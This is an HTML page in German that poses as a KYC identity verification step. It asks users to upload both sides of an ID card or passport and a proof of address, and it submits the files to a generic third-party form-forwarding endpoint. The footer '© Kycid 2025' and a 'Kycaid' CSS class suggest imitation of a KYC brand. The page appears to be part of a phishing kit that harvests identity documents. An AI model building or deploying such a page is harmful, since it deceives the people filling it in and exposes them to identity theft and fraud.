<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KYC Verifizierung – Dokumentenupload</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet" />

  <style>
    :root {
      --gold: #0066ff;
      --gray-bg: #f5f5f5;
      --text: #111;
    }

    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
      background-color: var(--gray-bg);
      color: var(--text);
    }

    .kyc-icon {
      display: block;
      margin: 0 auto 10px;
      width: 100px;
      height: 100px;
      fill: var(--gold);
    }

    .form-container {
      width: 90%;
      max-width: 700px;
      background-color: #fff;
      border-radius: 25px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
      margin: 40px auto 60px;
      padding: 40px 32px;
    }

    h2 {
      text-align: center;
      font-size: 20px;
      font-weight: 900;
      color: #000;
      margin-bottom: 12px;
    }

    p.subtitle {
      text-align: center;
      font-size: 14px;
      color: #666;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-weight: 700;
      font-size: 0.9rem;
      margin: 14px 0 6px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border-radius: 2px;
      border: 1px solid #ccc;
      background-color: #f9f9f9;
    }

    .small-text {
      font-size: 14px;
      color: #555;
      margin-top: 4px;
      margin-bottom: 12px;
    }

    button {
      padding: 14px;
      background-color: transparent;
      color: #999;
      font-size: 16px;
      font-weight: bold;
      border: 2px solid var(--gold);
      border-radius: 50px;
      cursor: pointer;
      width: 200px;
      display: block;
      margin: 20px auto 0;
      transition: all 0.3s ease;
    }

    button:hover {
      color: var(--gold);
    }

    .Kycaid-footer {
      background-color: #f7f6f2;
      padding: 30px 20px;
      font-size: 10px;
      color: #444;
      text-align: center;
      border-top: 1px solid #ddd;
    }
  </style>
</head>

<body>

  <div class="form-container">

    <!-- Icon -->
    <svg class="kyc-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">
      <rect x="12" y="20" width="104" height="72" rx="14" ry="14"
            fill="none" stroke="currentColor" stroke-width="6"/>
      <circle cx="44" cy="56" r="16" fill="none" stroke="currentColor" stroke-width="6"/>
      <path d="M28 80c0-9 7-16 16-16s16 7 16 16"
            fill="none" stroke="currentColor" stroke-width="6"/>
      <line x1="72" y1="40" x2="116" y2="40" stroke="currentColor" stroke-width="6"/>
      <line x1="72" y1="56" x2="116" y2="56" stroke="currentColor" stroke-width="6"/>
      <line x1="72" y1="72" x2="110" y2="72" stroke="currentColor" stroke-width="6"/>
      <circle cx="104" cy="28" r="16" fill="#0066ff"/>
      <path d="M96 28l6 6 10-10" fill="none" stroke="#fff" stroke-width="6" stroke-linecap="round"/>
    </svg>

    <!-- ONLY STEP 2 FORM -->
    <form action="https://formcarry.com/s/BnaBh-XE7en" method="POST" enctype="multipart/form-data">

      <h2>Dokumenten-Upload zur Verifizierung</h2>
      <p class="subtitle">
        Bitte laden Sie Ihr Ausweisdokument hoch (Vorder- und ggf. Rückseite) sowie einen gültigen Adressnachweis.
      </p>

      <label for="ausweisart">Art des Ausweisdokuments</label>
      <select id="ausweisart" name="Ausweisart">
        <option value="">Bitte auswählen</option>
        <option value="Personalausweis" selected>Personalausweis</option>
        <option value="Reisepass">Reisepass</option>
      </select>

      <label for="vorderseite">Vorderseite (Datei)</label>
      <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf"/>

      <div id="rueckseite-container">
        <label for="rueckseite">Rückseite (Datei)</label>
        <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf"/>
      </div>

      <!-- Adressnachweis -->
      <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
      <input type="file" id="addressProof" name="Adressnachweis" accept=".pdf,.jpg,.jpeg,.png"/>
      <p class="small-text">Dokument nicht älter als 3 Monate.</p>

      <button type="submit">Absenden</button>
    </form>
  </div>

  <footer class="Kycaid-footer">
    <p>© Kycid 2025. All rights reserved.</p>
  </footer>

  <script>
    const ausweisart = document.getElementById("ausweisart");
    const rueckseite = document.getElementById("rueckseite-container");

    function toggleRueckseite() {
      rueckseite.style.display = ausweisart.value === "Reisepass" ? "none" : "block";
    }

    ausweisart.addEventListener("change", toggleRueckseite);
    toggleRueckseite();
  </script>

</body>
</html>
